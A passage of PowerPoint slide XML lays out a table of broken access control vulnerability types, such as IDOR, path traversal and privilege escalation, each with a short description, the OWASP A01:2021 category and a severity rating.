          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Horizontal Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="2738437"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Access another user's data at same level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="2738437"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="2738437"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="3242429"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="3316367"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vertical Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="3316367"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Gain higher privileges (user → admin)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="3316367"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="3316367"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="3820358"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="3894296"/>
            <a:ext cx="2407206" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IDOR (Insecure Direct Object Reference)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="3894296"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Access objects by manipulating IDs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="3894296"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="3894296"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="4398288"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="4472226"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Path Traversal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="4472226"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Access files outside intended directory</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="4472226"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="4472226"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="4976217"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="5050155"/>
            <a:ext cx="2407206" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Missing Function Level Access Control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="5050155"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Access admin functions without checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="5050155"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="5050155"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Critical</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="5554147"/>
            <a:ext cx="10911126" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="5628084"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Forced Browsing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="5628084"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Access hidden/unlinked pages</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="5628084"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="5628084"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Medium</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="5917049"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="5990987"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Parameter Tampering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749760" y="5990987"/>
            <a:ext cx="2403396" cy="430054"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Modify parameters to bypass checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7477482" y="5990987"/>
            <a:ext cx="2403396" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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A01:2021</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10205204" y="5990987"/>
            <a:ext cx="2407206" cy="215027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="007EBD"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859637" y="6494978"/>
            <a:ext cx="10911126" cy="577929"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2018228" y="6568916"/>
